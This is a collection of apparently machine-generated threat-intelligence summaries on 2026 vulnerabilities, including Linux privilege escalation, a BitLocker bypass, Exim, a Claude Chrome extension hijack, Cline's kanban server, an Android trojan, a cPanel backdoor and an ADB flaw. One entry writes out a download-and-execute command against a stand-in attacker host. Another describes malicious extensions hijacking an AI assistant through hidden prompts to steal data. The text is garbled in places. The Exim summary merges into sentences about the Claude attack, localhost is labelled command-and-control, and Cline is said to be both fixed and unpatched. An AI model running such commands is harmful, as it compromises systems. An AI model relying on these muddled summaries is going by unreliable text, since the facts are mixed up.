doc_summary: Fragnesia is a new variant of the Dirty Frag Linux local privilege escalation vulnerability, tracked as CVE-2026-46300 with a CVSS score of 7.8. Discovered by William Bowling of the V12 security team, it affects the Linux kernel's XFRM ESP-in-TCP subsystem, allowing unprivileged local attackers to gain root access by modifying read-only file contents in the kernel page cache. Multiple Linux distributions have released advisories, and a proof-of-concept exploit is available. The vulnerability is similar to Copy Fail and Dirty Frag, enabling root access by corrupting the page cache memory of the /usr/bin/su binary. Mitigations include disabling esp4, esp6, and related xfrm/IPsec functionality, restricting local shell access, and hardening containerized workloads. A threat actor named berz0k is selling a zero-day Linux LPE exploit for $170,000, claiming it works on multiple major Linux distributions. AppArmor restrictions may serve as partial mitigation, and a patch is available.

doc_summary: YellowKey is a newly disclosed Windows zero-day vulnerability that allows attackers to bypass BitLocker protection on encrypted drives without needing the victim's recovery key. The exploit, published by the researcher Nightmare-Eclipse, affects Windows 11, Windows Server 2022, and Windows Server 2025. It requires physical access to the target device and exploits a weakness in the Windows Recovery Environment (WinRE) to gain access to the protected volume. The attack involves using specially prepared files on a USB device or writing them to the EFI system partition. Security researcher Will Dormann noted that the FsTx log on removable media could modify files on a different volume when replayed by WinRE, suggesting a deeper flaw in cross-volume NTFS transaction replay. The vulnerability is unpatched, raising concerns about potential copycat attacks. The exploit does not affect Windows 10, indicating a problem with newer WinRE behavior. The same researcher also disclosed GreenPlasma, another Windows flaw. Organizations using affected systems are advised to review BitLocker settings, WinRE exposure, and physical security controls.
kill_chain_summary: The YellowKey exploit follows a kill chain involving delivery through physical access and specially prepared files, exploitation of a vulnerability in WinRE to bypass BitLocker, and actions on objectives by accessing encrypted data. doc_summary: Fragnesia is a critical Linux local privilege escalation vulnerability discovered by William Bowling and the V12 team. It belongs to the Dirty Frag class and affects the ESP/XFRM subsystem, allowing attackers to gain root access by exploiting a logic error in network data packet handling. The vulnerability impacts all Linux kernel versions before the May 13, 2026 patch. A Proof of Concept (PoC) exploit targets the /usr/bin/su binary, enabling attackers to write arbitrary bytes into the kernel page cache without a race condition. This stealthy technique mirrors the Dirty Pipe vulnerability, making detection difficult. Administrators must disable vulnerable kernel modules and apply the official patch to mitigate the threat. The exploit requires disabling AppArmor restrictions on Ubuntu systems and involves creating a specialized network namespace. Immediate action is necessary to clear system caches or reboot to remove the malicious payload from memory.

doc_summary: Exim, an open-source Mail Transfer Agent for Unix-like systems, has released security updates to address a critical use-after-free vulnerability, CVE-2026-45185, also known as Dead.Letter. The vulnerability has been described as one of the highest-caliber bugs in Exim, requiring minimal server configuration to exploit. Exim has addressed the issue in version 4.99.3, urging users to upgrade immediately as no mitigations exist. Attackers leverage a trust boundary violation in the Claude Chrome extension to hijack the AI and exfiltrate data. The adversary's capability includes exploiting the vulnerability to gain unauthorized access to sensitive data from Gmail, Google Drive, and GitHub. The infrastructure involves malicious Chrome extensions that inject scripts into the Claude environment. doc_summary: A critical vulnerability named ClaudeBleed has been identified in Anthropic's AI assistant, compromising its security. The flaw in the Claude Chrome extension allows malicious add-ons to hijack the AI, even with zero declared permissions, leading to data theft from Gmail, Google Drive, and GitHub. The issue stems from a systemic trust boundary violation in the extension's architecture, where the externally_connectable manifest setting fails to authenticate specific scripts. Attackers can inject content scripts, gaining high-level privileges and issuing hidden prompts. diamond_model_summary: The incident involves a critical vulnerability in the Cline AI kanban package, allowing adversaries to execute remote code, steal data, and perform denial-of-service attacks. The adversary exploits WebSocket vulnerabilities, targeting developers using the kanban package. The attack infrastructure includes malicious websites that exploit the vulnerability, and the adversary's capabilities include executing arbitrary commands and exfiltrating data. doc_summary: A critical security vulnerability, CVE-2026-44211, in the Cline AI coding assistant's kanban package exposes developers to remote code execution, data theft, and denial-of-service attacks. Disclosed by security researcher Sagilayani, the flaw affects all versions before v2.13.0 and has a CVSS v3.1 score of 9.3. The vulnerability arises from missing authentication and origin validation in WebSocket connections, allowing attackers to connect to the kanban server on 127.0.0.1:3484 without restriction. The attack involves info leak, session detection, terminal hijack, and task termination. No patch is available, and the vulnerability affects macOS, Linux, and Windows systems. Mitigations include validating the Origin header, generating a random secret token, and adding authentication checks.
kill_chain_summary: The attack begins with reconnaissance, where the adversary identifies vulnerable systems running the Cline AI kanban package. Weaponization involves crafting malicious websites to exploit WebSocket vulnerabilities. Delivery occurs when developers visit these websites, leading to exploitation of the vulnerability. The adversary establishes command and control using WebSocket connections and performs actions on objectives, including data exfiltration and denial-of-service attacks. The attack leverages missing authentication and origin validation in WebSocket connections, affecting developers across multiple operating systems.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes IP addresses and command lines as indicators. The adversary exploits WebSocket vulnerabilities, using IP addresses like 127.0.0.1:3484 for command and control. Command lines such as 'curl https://attacker.com/shell.sh | bash' are used for remote code execution. These indicators are crucial for detection and response, as they provide insight into the adversary's tactics and techniques. The lack of authentication and origin validation in WebSocket connections is a significant weakness exploited by the adversary.

doc_summary: TrickMo is an Android banking trojan targeting users in France, Italy, and Austria. The latest variant, TrickMo C, observed by ThreatFabric, uses The Open Network (TON) for command-and-control (C2) communications. It includes features like SSH tunneling, SOCKS5 proxying, and network reconnaissance tools such as curl, dnslookup, ping, telnet, and traceroute. TrickMo abuses Android's accessibility services to hijack OTPs and phish credentials. The malware is distributed via phishing websites and dropper apps masquerading as TikTok and Google Play Services. It turns infected devices into network exit nodes, complicating IP-based fraud detection. The malware's use of TON for C2 reduces the effectiveness of traditional takedown efforts.

doc_summary: A threat actor named Mr_Rot13 exploited a critical cPanel flaw, CVE-2026-41940, to deploy a backdoor named Filemanager. This vulnerability allows authentication bypass, enabling remote attackers to control cPanel. QiAnXin XLab reported multiple threat actors exploiting this flaw for cryptocurrency mining, ransomware, botnet propagation, and backdoor implantation. Over 2,000 attacker IPs from Germany, United States, Brazil, and Netherlands are involved. A shell script downloads a Go-based infector from cp.dene.de.com, implants an SSH key, and drops a PHP web shell for remote command execution. JavaScript code injects a fake login page to steal credentials, encoded with ROT13, and transmits them to wrned.com. The attack culminates in a cross-platform backdoor affecting Windows, macOS, and Linux. Sensitive data is exfiltrated to a Telegram group by user 0xWR. The C2 domain was first registered in October 2020, with low detection rates for Mr_Rot13's infrastructure.

diamond_model_summary: The incident involves the exploitation of CVE-2026-0073, a critical Android vulnerability, by adversaries seeking unauthorized shell access via the ADB component. The capability involves exploiting a logic error in the wireless ADB mutual-authentication path, allowing attackers to impersonate a paired ADB host. The infrastructure requires network reachability to the ADB-over-TCP service, commonly through wireless debugging. Victims include Android devices with wireless ADB enabled, affecting developer phones, lab devices, and enterprise test fleets. The severity is critical due to the potential for unauthorized access and control of Android devices.
doc_summary: CVE-2026-0073 is a critical Android vulnerability documented in Google's May 2026 security bulletin. It involves a no-interaction remote code execution flaw in the adbd component, allowing attackers to execute code as the shell user without device owner interaction. The vulnerability stems from a logic error in the wireless ADB mutual-authentication path, specifically in the adbd_tls_verify_cert function inside auth.cpp. This flaw allows a crafted TLS client certificate to be incorrectly treated as trusted, enabling unauthorized remote systems to impersonate a paired ADB host and open a shell session. The issue is an authentication bypass, not a memory-corruption problem, making it particularly notable. The vulnerability affects developer phones, lab devices, emulators, and enterprise test fleets with wireless debugging enabled. Exploitation requires network reachability to the device's ADB-over-TCP service, commonly through wireless debugging. Public exploit references suggest researchers have moved the issue from advisory language to a reproducible attack path, changing the risk profile for organizations relying on Android devices. Google has addressed the issue in the May 2026 Android Security Bulletin, and defenders are urged to patch affected devices and disable wireless debugging where not needed.
kill_chain_summary: The kill chain for this incident begins with reconnaissance, where adversaries identify Android devices with wireless ADB enabled. Weaponization involves developing or obtaining a proof-of-concept exploit for CVE-2026-0073. Exploitation occurs when adversaries use the exploit to gain shell access. Command and control is maintained via shell access, allowing adversaries to perform system inspection and package interaction. The actions on objectives stage involves adversaries executing commands to discover files and directories on the compromised device. The incident highlights the importance of patching and disabling unnecessary services to prevent exploitation.
